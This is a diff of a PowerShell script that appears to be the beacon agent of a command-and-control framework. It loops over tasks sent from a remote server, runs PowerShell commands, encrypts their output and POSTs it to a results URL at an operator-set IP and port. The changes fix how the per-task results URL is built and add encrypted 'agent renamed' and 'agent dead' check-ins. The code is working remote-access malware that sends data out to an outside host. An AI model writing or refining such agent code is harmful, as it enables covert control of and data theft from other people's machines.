@@ -118,9 +118,9 @@ for (;;){
                 $res  = Encrypt $key $res
                 $data = @{result = "$res"}
 
-                $resultl = ("$resultl" + "$taskId")
+                $resultfl = ("$resultl" + "$taskId")
                 
-                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
 
             }
             elseif ($command -eq "powershell"){
@@ -134,30 +134,35 @@ for (;;){
                 $res  = Encrypt $key $res
                 $data = @{result = "$res"}
 
-                $resultl = ("$resultl" + "$taskId")
+                $resultfl = ("$resultl" + "$taskId")
                 
-                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
 
             }
             elseif ($command -eq "sleep"){
 
                 $n    = [int]$args[0]
                 $data = @{result = ""}
-                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+                $resultfl = ("$resultl" + "$taskId")
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
             }
             elseif ($command -eq "rename"){
                 
                 $name    = $args[0]
-                $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
-                $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
-            
+                $res = "VALID agent renamed to " + "$name"
+                $res  = Encrypt $key $res
                 $data    = @{result = ""}
-
-                # $resultl = ("$resultl" + "$taskId")
-
-                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+                $resultfl = ("$resultl" + "$taskId")
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
             }
             elseif ($command -eq "quit"){
+                $res = "VALID agent dead " + "$name"
+                $res  = Encrypt $key $res
+                $data    = @{result = "$res"}
+
+                $resultfl = ("$resultl" + "$taskId")
+                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+
                 exit
             }
         }
